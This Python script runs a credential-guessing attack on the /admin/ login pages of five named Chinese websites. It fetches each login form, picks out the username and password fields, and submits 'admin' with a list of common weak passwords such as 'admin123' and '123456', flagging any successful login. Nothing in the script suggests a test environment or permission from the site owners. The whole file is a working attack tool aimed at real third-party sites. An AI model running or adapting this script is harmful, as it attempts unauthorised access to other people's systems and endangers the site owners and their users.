#!/usr/bin/env python3
"""5 CN sites with /admin/ - fingerprint + login form + weak creds"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
SITES = ["http://zileijg.com", "http://xinxinjj.com", "http://yj-bf.com",
         "http://xybwg.com.cn", "http://zhongshengjinshuzhipin.com"]
PWS = ["admin", "admin123", "123456", "admin888", "12345678", "admin@123", "a123456"]

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None, referer=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

for site in SITES:
    print("=== %s ===" % site, flush=True)
    op, cj = get_opener()
    code, final, body = fetch(op, site + "/admin/")
    print("  /admin/: %s size=%d final=%s" % (code, len(body), final[:40]), flush=True)
    # login form fields
    fields = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', body, re.I)
    print("  fields:", fields[:8], flush=True)
    if "password" not in body.lower() and "密码" not in body:
        print("  no login form", flush=True)
        continue
    # try weak login (generic form)
    for pw in PWS:
        # build data from fields
        data = {}
        for f in fields:
            if "user" in f.lower() or "name" in f.lower():
                data[f] = "admin"
            elif "pass" in f.lower() or "pwd" in f.lower():
                data[f] = pw
        if not data:
            break
        code, final, body = fetch(op, site + "/admin/", data=urllib.parse.urlencode(data),
                                  referer=site + "/admin/")
        ok = "退出" in body or "logout" in body.lower() or "index" in final.lower() and "admin" in final.lower()
        print("  admin/%s: code=%s ok=%s" % (pw, code, ok), flush=True)
        if ok:
            print("  !!! HIT", flush=True)
            break
